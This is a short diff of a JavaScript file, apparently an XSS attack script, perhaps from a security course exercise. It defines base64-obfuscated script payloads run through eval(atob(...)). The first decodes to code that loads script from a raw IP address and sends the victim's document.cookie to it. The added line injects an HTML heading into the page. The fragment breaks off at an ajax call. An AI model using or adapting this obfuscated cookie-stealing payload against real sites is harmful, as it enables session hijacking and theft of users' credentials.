@@ -1,4 +1,5 @@
 const xss_payload = "<script>eval(atob(\"JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xOC4yMjMuOTQuMTE1L2FybWJvb2suanM/Y29va2llPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSk=\"));</script>";
+const payload = "<script>eval(atob(\"PGgzPkNTRUMgMzgwIEFuc3dlcnMgKFJlY29yZGVkKTwvaDM+\"));</script>";
 const my_id = 141;
 function delayed() {
 	$.ajax({
